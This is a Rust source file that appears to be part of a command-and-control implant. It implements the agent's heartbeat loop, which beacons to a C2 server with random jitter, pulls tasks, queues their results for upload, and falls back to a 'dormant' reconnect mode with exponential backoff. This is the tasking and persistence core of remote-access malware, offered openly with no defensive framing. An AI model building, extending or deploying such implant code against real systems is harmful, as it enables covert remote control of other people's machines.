use rand::Rng;
use tokio::{sync::mpsc, task::JoinHandle};
use std::sync::Arc;

use crate::post::commands::{AgentCommand, ResultQueue};
use crate::utils::{logger, config::AppConfig};
use crate::communication::beacon;


pub struct AgentState {
    pub agent_id: u64,
    pub session_id: String,
    pub offline: bool,
    pub logger: Arc<logger::Logger>,
    pub result_queue: ResultQueue,
    pub tx: mpsc::Sender<AgentCommand>,
    pub heartbeat_handle: Option<JoinHandle<Result<(), Box<dyn std::error::Error + Send + Sync>>>>
}

impl AgentState {
    
    pub fn start_heartbeat(&mut self, config: &AppConfig) -> 
        JoinHandle<Result<(), Box<dyn std::error::Error + Send + Sync>>> {

        let server_address = config.server_address.clone();
        let timeout_secs = config.timeout_seconds;
    
        let agent_id = self.agent_id;
        let session_id = self.session_id.clone();
        let tx = self.tx.clone();
        let result_queue = Arc::clone(&self.result_queue);
        let logger: Arc<logger::Logger> = Arc::clone(&self.logger);
        
        tokio::spawn(async move {
            loop {
                let jitter = rand::thread_rng().gen_range(0..20);
                tokio::time::sleep(std::time::Duration::from_secs(60 + jitter)).await; // FIX duration and jitter later
    
                // Get results from queue
                let results = result_queue.lock().await.take();
                // Send heartbeat to C2 to requests tasks
                match beacon::heartbeat(
                    &server_address,
                    agent_id,
                    &session_id,
                    timeout_secs,
                    results,
                    &*logger
                ).await {
                    Some(msgs) => {
                        // If tasks exist, complete them and store results somewhere
                        // Send results on next heartbeat
                        for msg in msgs {
                            let _ = tx.send(msg).await;
                        }
                    }
                    None => {
                        // Failed to send connect/send message to C2 -> switch back to offline mode
                        return Err("C2 heartbeat failed.".into());
                    }
                }
    
            }
        })
    
        
    }

    pub async fn offline_mode(&mut self, config: &AppConfig) {
        // If operating in offline mode, check every X
        let mut interval_secs = 60; // Start with 1 min
        let max_interval = 86400; // set cap at 24 hr 

        loop {
            self.logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
            tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;
    
            let (new_agent_id, session_id) = beacon::reconnect(
                &config.server_address, 
                self.agent_id,
                &self.session_id,
                config.timeout_seconds,
                &self.logger).await;
    
            if new_agent_id != 0 {
                self.logger.log("Reconnected to C2. Exiting offline mode.");
                self.agent_id = new_agent_id;
                self.session_id = session_id;
                self.offline = false;
                break;
            }
    
            // Back off retry interval (capped)
            interval_secs = std::cmp::min(interval_secs * 2, max_interval);
        }

    }

    pub async fn offline_mode_key(&mut self, config: &AppConfig, key: Vec<u8>) {
        // If operating in offline mode, check every X
        let mut interval_secs = 60; // Start with 1 min
        let max_interval = 86400; // set cap at 24 hr 

        loop {
            self.logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
            tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;
    
            let (agent_id, session_id) = beacon::initial_beacon(
                &config.server_address,
                config.retries,
                config.timeout_seconds,
                &self.logger,
                &key).await;
    
            if agent_id != 0 {
                self.logger.log("Connected to C2. Exiting offline mode.");
                self.agent_id = agent_id;
                self.session_id = session_id;
                self.offline = false;
                break;
            }
    
            // Back off retry interval (capped)
            interval_secs = std::cmp::min(interval_secs * 2, max_interval);
        }

    }


}